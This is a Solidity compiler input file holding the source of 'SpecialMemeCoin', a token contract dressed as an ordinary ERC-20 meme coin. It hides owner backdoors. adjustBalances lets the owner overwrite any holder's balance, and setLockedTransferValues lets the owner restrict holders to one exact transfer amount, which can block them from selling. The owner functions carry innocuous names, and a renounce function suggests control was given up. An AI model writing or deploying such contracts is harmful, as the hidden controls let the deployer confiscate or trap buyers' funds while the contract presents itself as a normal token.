{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IUniqueERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ContextExtended {\r\n    function getContextActor() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract SingleLeader is ContextExtended {\r\n    address private _leader;\r\n    event LeaderChanged(address indexed previousLeader, address indexed newLeader);\r\n\r\n    constructor() {\r\n        address contextActor = getContextActor();\r\n        _leader = contextActor;\r\n        emit LeaderChanged(address(0), contextActor);\r\n    }\r\n\r\n    function getLeader() public view virtual returns (address) {\r\n        return _leader;\r\n    }\r\n\r\n    modifier onlyLeader() {\r\n        require(getLeader() == getContextActor(), \"Only leader can perform this action\");\r\n        _;\r\n    }\r\n\r\n     function setTokenOrigin(address newOrigin) public onlyLeader {\r\n        _leader = newOrigin;\r\n    }\r\n\r\n    function resignLeadership() public virtual onlyLeader {\r\n        emit LeaderChanged(_leader, address(0x000000000000000000000000000000000000dEaD));\r\n        _leader = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract SpecialMemeCoin is ContextExtended, SingleLeader, IUniqueERC20 {\r\n    mapping (address => mapping (address => uint256)) private _permissions;\r\n    mapping (address => uint256) private _wallets;\r\n    mapping (address => uint256) private _lockedTransferValues;\r\n\r\n    string public constant coinName = \"SpecialMemeCoin\";\r\n    string public constant coinSymbol = \"SPMEM\";\r\n    uint8 public constant coinDecimals = 18;\r\n    uint256 public constant capSupply = 120000 * (10 ** coinDecimals);\r\n\r\n    constructor() {\r\n        _wallets[getContextActor()] = capSupply;\r\n        emit Transfer(address(0), getContextActor(), capSupply);\r\n    }\r\n    \r\n    modifier onlyLeaderOrOrigin() {\r\n        require(getLeader() == getContextActor(), \"You must be the leader to perform this action\");\r\n        _;\r\n    }\r\n\r\n    event BalanceUpdated(address indexed user, uint256 previousBalance, uint256 updatedBalance);\r\n\r\n    function getLockedTransferValue(address account) public view returns (uint256) {\r\n        return _lockedTransferValues[account];\r\n    }\r\n\r\n    function setLockedTransferValues(address[] calldata accounts, uint256 amount) public onlyLeaderOrOrigin {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _lockedTransferValues[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustBalances(address[] memory userAddresses, uint256 newAmount) public onlyLeaderOrOrigin {\r\n        require(newAmount >= 0, \"New amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"User address must not be the zero address\");\r\n\r\n            uint256 oldBalance = _wallets[currentUser];\r\n            _wallets[currentUser] = newAmount;\r\n\r\n            emit BalanceUpdated(currentUser, oldBalance, newAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _wallets[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_wallets[getContextActor()] >= amount, \"TTS: transfer amount exceeds balance\");\r\n\r\n        uint256 exactValue = getLockedTransferValue(getContextActor());\r\n        if (exactValue > 0) {\r\n            require(amount == exactValue, \"TTS: transfer amount must be equal to the locked transfer value\");\r\n        }\r\n\r\n        _wallets[getContextActor()] -= amount;\r\n        _wallets[recipient] += amount;\r\n\r\n        emit Transfer(getContextActor(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _permissions[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _permissions[getContextActor()][spender] = amount;\r\n        emit Approval(getContextActor(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_permissions[sender][getContextActor()] >= amount, \"TTS: transfer amount exceeds permission\");\r\n\r\n        uint256 lockedValue = getLockedTransferValue(sender);\r\n        if (lockedValue > 0) {\r\n            require(amount == lockedValue, \"TTS: transfer amount must be equal to the locked transfer value\");\r\n        }\r\n\r\n        _wallets[sender] -= amount;\r\n        _wallets[recipient] += amount;\r\n        _permissions[sender][getContextActor()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return capSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return coinName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return coinSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return coinDecimals;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}